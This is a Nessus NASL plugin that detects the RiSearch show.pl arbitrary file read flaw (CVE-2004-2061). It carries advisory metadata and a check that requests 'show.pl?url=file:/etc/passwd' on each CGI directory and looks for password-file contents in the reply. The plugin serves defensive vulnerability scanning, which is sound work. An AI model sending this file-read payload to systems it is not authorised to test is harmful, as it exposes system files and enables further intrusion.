#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security, Inc.
#
# Ref: IRM PLC <advisories at irmplc dot com>
#
# This script is released under the GNU GPLv2

include("compat.inc");

if(description)
{
 script_id(14222);
 script_version ("$Revision: 1.13 $"); 
 script_cve_id("CVE-2004-2061");
 script_bugtraq_id(10812);
 script_xref(name:"OSVDB", value:"8266");
 script_xref(name:"Secunia", value:"12173");

 script_name(english:"RiSearch show.pl Arbitrary File Access");

 script_set_attribute(
  attribute:"synopsis",
  value:
"A web application running on the remote host has an arbitrary file
read vulnerability."
 );
 script_set_attribute(
  attribute:"description",
  value:
"The remote host appears to be running RiSearch, a local search
engine.

This version contains an information disclosure vulnerability. 
Passing a local file URI to 'show.pl' reveals that file's contents.
A remote attacker could use this information to read arbitrary files
from the system, which could be used to mount further attacks."
 );
 script_set_attribute(
  attribute:"see_also",
  value:"http://archives.neohapsis.com/archives/bugtraq/2004-07/0302.html"
 );
 script_set_attribute(
  attribute:"solution",
  value:"Upgrade to the latest version of this application."
 );
 script_set_attribute(
  attribute:"cvss_vector",
  value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();
 
 summary["english"] = "Determines the presence of RiSearch show.pl";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"CGI abuses");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);

foreach dir ( cgi_dirs() )
{
	req = http_get(port:port, item:dir + "/search/show.pl?url=file:/etc/passwd");
 	res = http_keepalive_send_recv(port:port, data:req);
 	if ( res == NULL ) 
		exit(0);
 	if ( "root:" >< res &&
      		"adm:" >< res ) 
	{
	 	security_warning(port);
	 	exit(0);
	}
}
